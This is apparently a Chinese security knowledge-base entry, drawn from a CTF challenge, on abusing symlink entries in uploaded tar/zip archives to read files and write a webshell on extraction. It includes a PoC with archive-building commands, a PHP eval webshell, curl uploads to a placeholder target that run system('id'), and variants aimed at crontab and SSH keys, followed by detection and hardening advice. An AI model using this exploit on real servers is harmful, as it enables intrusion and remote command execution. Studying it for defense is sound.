---
id: web-generic-file-upload-archive-symlink-extract-read-write
title: 压缩包内软链接解压导致任意文件读取与写入
type: scenario
domain: web
path: web/generic/file-upload
technique: archive-symlink-extract-read-write
tags:
- web
- file-upload
- archive
- symlink
- tar
- zip
- arbitrary-write
- arbitrary-read
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:27:33+08:00'
  notes: 已对照原文与截图 16-21 核对：长城杯 EZ_upload 先解压 html->/var/www/html 软链接、再解压 html/shell.php 写 Web 根，成功读 flag；tar 默认保留 symlink、zip 需 --symlinks 均正确；未验证点：同名条目覆盖变体原文未实测
url: /docs/web/generic/file-upload/web-generic-file-upload-archive-symlink-extract-read-write/
draft: false
kb_aliases:
- 压缩包软链接
- tar 软链接解压
- zip symlink 攻击
- 解压软链接写 WebShell
- 软链接任意文件读写
---

## 一句话结论

当应用接收用户上传的 tar/zip 并在服务端解压，且不拒绝压缩包内的符号链接条目时，攻击者可让解压结果包含指向 `/flag`、`/etc/passwd` 或 Web 根目录的软链接：后续读取该链接即泄露敏感文件，或让后续解压通过该链接把 WebShell 写入 Web 根。

## 原理

- tar 默认保留符号链接条目（zip 需 `--symlinks` 才保留），解压时会在目标目录创建一个指向归档内目标路径的软链接。
- 读：归档里放 `link -> /flag`，解压后应用若读取 `link`（或把解压目录当静态目录提供访问），内核跟随软链接读到 `/flag`。
- 写：分两步。先上传包含 `html -> /var/www/html` 的归档，解压后解压目录里出现一个指向 Web 根的软链接 `html`；再上传包含 `html/shell.php` 的归档，解压器在写入 `html/shell.php` 时会跟随已存在的 `html` 软链接，把 `shell.php` 写进 `/var/www/html/`。
- 覆盖：归档内先放一个软链接条目，再放一个同名普通文件条目；解压器先创建链接、再写同名文件时，内容会落到链接指向的目标（是否成功取决于解压器对同名条目的处理顺序/覆盖策略）。
- 之所以成立：解压器把“归档内路径”当作数据，没有把软链接条目当作危险对象；文件系统在后续 open/write 时按路径重新解析并跟随链接。

## 触发条件

- 存在上传归档并由服务端解压的功能（题目导入、主题/插件安装、备份恢复、批量导入等）。
- 解压逻辑未拒绝符号链接/硬链接条目，或使用的库默认保留链接。
- 解压目录对应用进程可写，且后续读取/写入路径会经过软链接。
- 写 WebShell 变体还要求目标 Web 根可写，且 Web 服务器解析脚本。

## 利用步骤

1. 确认上传点会解压归档（上传后目录中出现归档内文件）。
2. 读文件：本地创建 `ln -s /flag link`，用 `tar -cvf read.tar link` 打包上传；触发应用读取/展示 `link`。
3. 写文件：
   - 创建 `ln -s /var/www/html html`，`tar -cvf 1.tar html`，上传并解压；
   - 在本地新建真实目录 `html`，放入 `shell.php`，`tar -cvf 2.tar html/shell.php`，上传并解压；
   - 第二次解压跟随第一次创建的 `html` 软链接，把 `shell.php` 写入 Web 根。
4. 访问 `/shell.php` 执行命令。
5. 若应用只允许一次上传，可把“软链接 + 同名目录文件”放在同一个归档中，按解压顺序尝试覆盖。

## PoC

```bash
# 读文件：软链接指向 /flag
ln -s /flag link
tar -cvf read.tar link

# 写 WebShell：第一步创建指向 Web 根的软链接
ln -s /var/www/html html
tar -cvf 1.tar html

# 第二步：真实目录 html 中放 shell.php，再打包（注意写 html/shell.php 路径）
mkdir html
echo '<?php eval($_POST["a"]); ?>' > html/shell.php
tar -cvf 2.tar html/shell.php

# 依次上传 1.tar、2.tar 并触发解压
# 解压 2.tar 时，html 已是软链接 -> /var/www/html，shell.php 被写入 Web 根
curl -s -X POST 'https://target.example/upload' -F 'file=@1.tar'
curl -s -X POST 'https://target.example/upload' -F 'file=@2.tar'
curl -s -X POST 'https://target.example/shell.php' -d 'a=system("id");'
```

```text
# 预期：/var/www/html/shell.php 存在并可执行；
# 读文件变体：应用读取 link 时返回 /flag 内容。
```

## 变体与关联

- 变体：zip 用 `zip --symlinks payload.zip link` 保留链接；Python `zipfile` 默认不写 symlink，需要 `ZipInfo.external_attr` 设置链接标志。
- 变体：软链接指向 `/etc/crontab`、`/root/.ssh/authorized_keys`、`/etc/passwd` 等，结合后续写入/读取扩大影响。
- 变体：同名条目覆盖（先链接后文件）写入系统文件；成功率取决于解压器覆盖策略。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（`../` 路径穿越的 Zip Slip）；[[pentest-privilege-escalation-cp-option-injection-symlink-read]]（cp 选项注入 + 软链接读取）。
- 边界：解压器拒绝 symlink/hardlink、解压到隔离目录、以 `O_NOFOLLOW`/`realpath` 校验、或 Web 根不可写时，利用受阻。写 WebShell 需要两步上传或可控解压顺序。

## 检测与防御

- 检测：监控上传归档中出现 symlink/hardlink 条目；解压目录出现指向 Web 根、`/etc`、`/root` 的链接；Web 根出现非预期脚本文件。
- 修复：解压前遍历条目，拒绝 `issym()`/`islnk()`；使用安全的解压库/过滤器（如 Python 3.12 `tarfile` 的 `filter='data'`）；解压到隔离目录并用 `realpath` 校验。
- 加固：Web 根不可写；Web 服务器禁用 FollowSymLinks（Apache `Options -FollowSymLinks`、Nginx `disable_symlinks on`）；上传目录与 Web 根分离。
